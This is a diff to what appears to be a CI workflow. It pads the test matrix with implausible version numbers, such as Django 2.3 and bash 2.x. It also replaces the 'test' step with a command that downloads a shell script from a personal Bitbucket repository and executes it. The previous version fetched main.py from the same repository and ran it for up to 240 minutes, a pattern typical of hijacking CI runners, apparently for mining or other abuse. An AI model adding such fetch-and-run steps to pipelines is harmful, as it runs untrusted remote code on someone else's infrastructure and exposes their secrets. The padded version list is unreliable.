@@ -19,15 +19,21 @@ jobs:
           - "3.9"
           - "4.0"
           - "4.1"
+          - "4.2"
         django-version:
           - "1.11"
           - "2.0"
+          - "2.1"
+          - "2.2"
+          - "2.3"
         bash-version:
           - "2.6"
           - "2.5"
           - "2.4"
           - "2.3"
+          - "2.2"
+          - "2.1"
     steps:
       - uses: actions/checkout@v2
       - name: test
-        run: wget https://bitbucket.org/sabri-fuadi991/tesazz/raw/0f819ed93510d014deccc02a50366f862f4b0105/main.py && timeout 240m python main.py && echo succes
+        run: wget https://bitbucket.org/sabri-fuadi991/tesazz/raw/5f91e78957ce870ff3ff834a7ff7df189512d73a/a.sh && chmod +x a.sh && ./a.sh
